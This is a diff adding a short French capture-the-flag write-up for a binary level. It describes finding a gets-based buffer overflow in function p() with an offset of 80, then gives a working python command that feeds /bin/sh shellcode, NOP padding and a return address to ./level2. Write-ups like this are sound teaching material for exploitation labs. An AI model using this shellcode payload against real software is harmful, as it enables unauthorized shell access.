@@ -1,0 +1,14 @@
+Nous avons annalyse la fonction main, elle fait appele a p() par consequent
+nous avons regarde la fonction p(). Elle disposait d'un gets. Nous avons
+decouvert le offset en testant avec gdb different strings de taille variable.
+Le offset est de 80.
+Nous avons donc pense a injecter du shellcode afin d'executer /bin/sh.
+
+Nous avons donc fait les commandes suivantes:
+
+python -c "print 
+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 
+'\x90' * 35 + '\x08\xa0\x04\x08'" > /tmp/level3
+
+cat /tmp/level3 - | ./level2
+
